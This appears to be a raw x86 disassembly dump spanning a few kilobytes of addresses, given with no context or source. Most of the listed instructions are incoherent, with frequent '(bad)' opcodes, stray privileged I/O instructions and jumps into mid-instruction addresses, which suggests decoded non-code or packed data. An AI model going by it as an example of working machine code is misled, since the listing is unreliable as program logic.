  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
